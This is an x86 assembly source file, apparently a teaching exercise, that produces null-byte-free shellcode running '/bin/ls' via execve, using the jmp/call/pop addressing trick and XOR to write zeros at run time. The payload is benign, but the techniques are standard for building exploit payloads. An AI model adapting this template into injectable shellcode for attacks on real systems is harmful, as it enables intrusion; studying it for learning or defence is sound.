###################################
# Produces shellcode that       
# executes 'ls' via execve on the 
# console without any 0x00 bytes.
#                               
# @author apbasset                
###################################
.text                             #
.global main                      #
main:                             #
  jmp get_addr                    # Jump to the string "/bin/ls" is
execve:                           # Execute the steps necessary to produce shellcode for execve/ls
  popl %esi                       # Get the address of the string "/bin/ls" off the stack
  pushw $0x1                      # Push 0x1 onto the stack
  popw 0x7(%esi)                  # Pop 0x1 onto esi + 7
  xor $0x1, 0x7(%esi)             # XOR esi + 7 and 0x1 to get 0x0
  pushl %esi                      # Push esi onto the stack
  popl 0x8(%esi)                  # Pop esi onto esi + 8
  pushl $0x1                      # Push 0x1 onto the stack
  popl 0xc(%esi)                  # Pop 0x1 onto esi + 12
  xor $0x1, 0xc(%esi)             # XOR esi + 12 and 0x1 to get 0x0
  pushl $0xb                      # Push 0xb onto the stack
  popl %eax                       # Pop oxb into eax
  pushl %esi                      # Push esi onto the stack
  popl %ebx                       # Pop esi into ebx
  leal 0x8(%esi), %ecx            # Copy argv into ecx
  leal 0xc(%esi), %edx            # Copy env into edx
  int $0x80                       # System call interrupt
exit:                             # Exits the program
  pushl $0x1                      # Push 0x1 onto the stack
  popl %eax                       # Pop 0x1 into eax
  pushl $0x1                      # Push 0x1 onto the stack
  popl %ebx                       # Pop 0x1 into ebx
  xor $0x1, %ebx                  # XOR ebx and 0x1 to get 0x0
  int $0x80                       # System call interrupt
get_addr:                         #
  call execve                     # Calls the main subroutine to execute execve/ls
  .string "/bin/ls"               # The string to print
###################################
